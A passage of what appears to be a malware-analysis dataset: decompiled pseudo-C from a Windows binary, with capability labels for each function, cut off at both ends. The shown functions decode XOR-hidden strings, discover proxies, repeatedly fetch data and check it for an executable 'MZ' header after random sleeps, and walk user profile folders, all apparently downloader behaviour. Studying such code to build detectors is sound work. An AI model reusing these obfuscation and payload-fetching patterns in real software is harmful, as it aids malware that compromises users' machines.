puVar4[var_6ch];\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_70h);\n            iVar6 = fcn.0040bb4e(0, &ARG_0, &var_14h, &var_68h);\n            if (iVar6 == 0) {\n                if (var_14h == 0) {\n                    fcn.00407fc3();\n                    uVar3 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    break;\n                }\n                if (var_20h < var_14h) {\n                    fcn.00407fc3();\n                    var_64h = var_64h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_64h % 600000 + 60000);\n                }\n                else if (((4 < var_14h) && (var_14h == var_20h)) &&\n                        ((var_1ch != NULL && ((*var_1ch == 'M' && (var_1ch[1] == 'Z')))))) {\n                    fcn.00407d18();\n                    fcn.00407fc3();\n                    uVar3 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    break;\n                }\n            }\n            uVar3 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            puVar4 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_18h = var_18h + 1;\n    } while (var_ch < 0x41c760);\n    iVar9 = *var_5ch;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return iVar9 != 0;\n}\n",
        "token_count": 1869
    },
    "004078a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004078a6(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint pszFile;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_58h;\n    int32_t var_54h;\n    uint var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t pProxyConfig;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t pszSrch;\n    int32_t var_28h;\n    uchar *psz1;\n    int32_t lpcwszUrl;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    puVar10 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar10 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.00407bd8(),  iVar6 != 0)) {\n        iVar6 = 6;\n        uVar8 = 1;\n        var_44h = 6;\n        if (((pProxyConfig != 0) || (var_38h != 0)) &&\n           (iVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar4 != 0)) {\n            puVar10 = &pAutoProxyOptions;\n            for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            if (pProxyConfig != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 1;\n                var_58h = var_58h | 1;\n            }\n            if (var_38h != 0) {\n                pAutoProxyOptions = pAutoProxyOptions | 2;\n                var_54h = var_38h;\n            }\n            var_48h = 1;\n            puVar10 = &pProxyInfo;\n            for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar4, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar6 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n                pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_8h != 0) {\n                    (*pcVar2)(var_8h);\n                }\n                goto code_r0x00407b7c;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_8h != 0) {\n                (*pcVar2)(var_8h);\n            }\n        }\n        if (var_34h != 0) {\n            if (var_30h == 0) {\ncode_r0x00407a1a:\n                iVar6 = var_34h;\n                iVar4 = fcn.0040e81e();\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar4 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x00407b7c;\n                }\n                pProxyInfo = 0x6f354330;\n                psz2 = 0x41335819;\n                var_8h = 0x43626d1c;\n                var_4h._0_2_ = 0x6f41;\n                var_1ch = 0x6f414358;\n                var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x6d);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                pszSrch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_28h = &pProxyInfo - pszSrch;\n                var_14h = 0;\n                do {\n                    var_40h = 5;\n                    *(var_14h + pszSrch) = *(&var_1ch + var_14h % 5) ^ (var_14h + pszSrch)[var_28h];\n                    var_14h = var_14h + 1;\n                } while (var_14h < 0xe);\n                pProxyInfo = 0x74104100;\n                psz2 = 0x4118462d;\n                var_8h = 0x46597417;\n                var_1ch = 0x74644168;\n                var_18h._0_2_ = 0x4659;\n                uVar8 = (*pcVar2)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar6 = pszSrch;\n                iVar9 = 0;\n                var_28h = &pProxyInfo - iVar4;\n                do {\n                    puVar1 = iVar9 + iVar4;\n                    iVar7 = iVar9 % var_44h;\n                    iVar9 = iVar9 + 1;\n                    *puVar1 = *(&var_1ch + iVar7) ^ puVar1[var_28h];\n                } while (iVar9 < 0xc);\n                iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar9 == lpcwszUrl;\n                var_14h = 0;\n                lpcwszUrl = fcn.0040e791(&var_14h);\n                uVar8 = 1;\n                while (pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar4);\n                    if ((pszSrch == (iVar9 == lpcwszUrl)) && (iVar9 = fcn.0040e81e(),  iVar9 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar9 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        (*pcVar2)(uVar5);\n                        goto code_r0x00407b7c;\n                    }\n                    lpcwszUrl = fcn.0040e791(&var_14h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar2)(0, iVar6);\n                (*pcVar3)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.0040e791(&var_14h);\n                    if (iVar6 == 0) goto code_r0x00407a1a;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x00407b7c:\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_38h != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_38h);\n    }\n    if (var_34h != 0) {\n        (*pcVar2)(var_34h);\n    }\n    if (var_30h != 0) {\n        (*pcVar2)(var_30h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2247
    },
    "00407d18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407d18(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "004088d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004088d2(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00408c39();\n    fcn.00408151(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.00408151(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x004089d9:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x004089fa;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x004089c4;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x004089d9;\ncode_r0x004089c4:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x004089fa;\n        }\n    }\n    uVar6 = 8;\ncode_r0x004089fa:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 816
    },
    "00408c39": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00408c39(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41cd00 == NULL) {\n        var_2ch = 0x231f433b;\n        var_28h = 0x60465902;\n        var_24h = 0xa16233a;\n        var_20h._0_2_ = 0x4301;\n        var_20h._2_1_ = 0x48;\n        var_1ch = 0x4c483072;\n        var_18h._0_2_ = 0x6f75;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        var_8h = 6;\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_10h;\n            iVar5 = iVar8 % 6;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_2ch - var_10h];\n        } while (iVar8 < 0xf);\n        var_2ch = 0x1f050b2c;\n        var_28h = 0x5c741629;\n        var_24h = 0x16201559;\n        var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x47);\n        var_1ch = 0x71776e47;\n        var_18h._0_2_ = 0x7a4c;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        iVar8 = var_10h;\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + iVar5;\n            iVar6 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_2ch - iVar5];\n        } while (iVar7 < 0xd);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5, var_10h);\n        *0x41cd00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar3)(0, iVar8);\n        (*pcVar2)(uVar4);\n        if (*0x41cd00 == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar8 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar8 != 0)) {\n        iVar5 = (**0x41cd00)(iVar8, &var_4h);\n        var_4h = var_4h & -(iVar5 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar8);\n    }\n    return var_4h;\n}\n",
        "token_count": 961
    },
    "00409a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00409a78(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.0040101f();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 276
    },
    "0040af3b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040af3b(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint lpcchSize;\n    int32_t lpMem;\n    uint ARG_0;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint lpFileName;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint lpProfileDir;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    uVar3 = (*pcVar2)(8, 0x208);\n    lpFileName = (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(8, 0x208);\n    ARG_0 = (*pcVar6)(uVar3);\n    lpcchSize = 0x104;\n    var_28h = 0x44204d7e;\n    var_24h = 0x4f2c3237;\n    var_20h = 0x4d125428;\n    var_1ch = 0x3231441c;\n    var_18h = 0x54304f39;\n    var_14h = 0x44214d5b;\n    var_10h = 0x4f3e3233;\n    var_ch = 0x4d665418;\n    var_8h = 0x3239442a;\n    var_4h = 0x54444f3d;\n    var_3ch = 0x444f4d32;\n    var_38h._0_1_ = 0x54;\n    uVar3 = (*pcVar2)(8, 0x51);\n    lpMem = (*pcVar6)(uVar3);\n    var_60h = 5;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + lpMem;\n        iVar4 = iVar7 % 5;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_3ch + iVar4) ^ puVar1[&var_28h - lpMem];\n    } while (iVar7 < 0x28);\n    var_28h = 0x52044179;\n    var_24h = 0x417c6c1d;\n    var_20h = 0x6c195215;\n    var_1ch = 0x52284159;\n    var_18h = 0x41576c21;\n    var_14h = 0x6c0c5217;\n    var_10h = 0x52284154;\n    var_ch = 0x415d6c39;\n    var_8h = 0x6c1d5219;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4138);\n    var_30h = 0x52744138;\n    var_2ch._0_2_ = 0x6c6d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_7ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    uVar3 = lpProfileDir;\n    var_48h = 6;\n    var_3ch = var_7ch;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + var_7ch;\n        iVar4 = iVar7 % 6;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_30h + iVar4) ^ puVar1[&var_28h - var_7ch];\n    } while (iVar7 < 0x26);\n    var_78h = lpMem;\n    iVar7 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar3);\n        iVar7 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_40h = iVar7;\n        while (iVar7 != -1) {\n            iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4109c0);\n            if ((iVar4 != 0) && (iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4109c4),  iVar4 != 0)) {\n                var_5ch = 0;\n                var_50h = 0x44687534;\n                var_4ch._0_2_ = 0x5241;\n                var_58h = 0x44427568;\n                var_54h._0_2_ = 0x5241;\n                var_30h = 0x70593437;\n                var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x52);\n                do {\n                    uVar3 = (*pcVar6)(8, 0xd);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    uVar3 = lpFileName;\n                    iVar4 = 0;\n                    var_68h = iVar7;\n                    var_64h = &var_50h - iVar7;\n                    do {\n                        puVar1 = iVar4 + iVar7;\n                        iVar5 = iVar4 % var_48h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_58h + iVar5) ^ puVar1[&var_50h - iVar7];\n                    } while (iVar4 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, lpProfileDir);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(uVar3, iVar7);\n                    var_14h = 0x702a3412;\n                    var_10h = 0x5911370e;\n                    var_ch = 0x346b5203;\n                    var_8h = 0x3721707c;\n                    var_4h = CONCAT22(var_4h._2_2_, 0x5934);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                    iVar4 = 0;\n                    var_64h = &var_14h - iVar7;\n                    do {\n                        puVar1 = iVar4 + iVar7;\n                        iVar5 = iVar4 % var_60h;\n                        iVar4 = iVar4 + 1;\n                        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_14h - iVar7];\n                    } while (iVar4 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar7, lpProfileDir, &psz1, (&var_7ch)[var_5ch]);\n                    fcn.0040d8a5(1);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    uVar3 = (*pcVar6)(0, var_68h);\n                    (*pcVar2)(uVar3);\n                    var_5ch = var_5ch + 1;\n                    iVar7 = var_40h;\n                } while (var_5ch < 2);\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar7, &lpFindFileData);\n            if (iVar4 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar7);\n                iVar7 = -1;\n                var_40h = -1;\n            }\n        }\n    }\n    var_24h = 0x786a667d;\n    var_20h = 0x3915582c;\n    var_1ch = 0x663d550c;\n    var_18h = 0x58077854;\n    var_14h = 0x55173909;\n    var_10h = 0x781c662c;\n    var_ch = 0x39325809;\n    var_8h = 0x6635551d;\n    var_4h = 0x58557849;\n    var_30h = 0x78396658;\n    var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x55);\n    uVar3 = (*pcVar6)(8, 0x49);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar4 = 0;\n    var_68h = &var_24h - iVar7;\n    do {\n        puVar1 = iVar4 + iVar7;\n        iVar5 = iVar4 % var_60h;\n        iVar4 = iVar4 + 1;\n        *puVar1 = *(&var_30h + iVar5) ^ puVar1[&var_24h - iVar7];\n    } while (iVar4 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, lpProfileDir, 0x104);\n    fcn.0040d8a5(1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, ARG_0);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, lpProfileDir);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar7);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, var_3ch);\n    (*pcVar6)(uVar3);\n    uVar3 = (*pcVar2)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 2650
    },
    "0040b3cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0040b3cf(int32_t arg_8h, uint *lpdwNumberOfBytesAvailable, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t lpdwNumberOfBytesRead)\n\n{\n    uint8_t *puVar1;\n    ushort *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t iVar6;\n    code *pcVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint var_418h;\n    uint lpszHeaders;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    int32_t var_f8h;\n    int32_t var_f4h;\n    int32_t var_f0h;\n    uint lpdwBufferLength;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_c9h;\n    uint var_c5h;\n    uint var_c1h;\n    uint var_bdh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_77h;\n    uint var_73h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    int32_t var_48h;\n    int32_t *var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t lpMultiByteStr;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t hRequest;\n    uint lpBuffer;\n    uint *var_8h;\n    uint var_4h;\n    \n    puVar8 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar5 = 0x100; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &var_418h;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    if (arg_8h == 0x40) {\n        var_fch = 0;\n        var_100h = 0x34367964;\ncode_r0x0040b444:\n        var_104h = 0x6f62722f;\n    }\n    else {\n        if (arg_8h == 0x20) {\n            var_fch = 0;\ncode_r0x0040b43a:\n            var_100h = 0x32337964;\n            goto 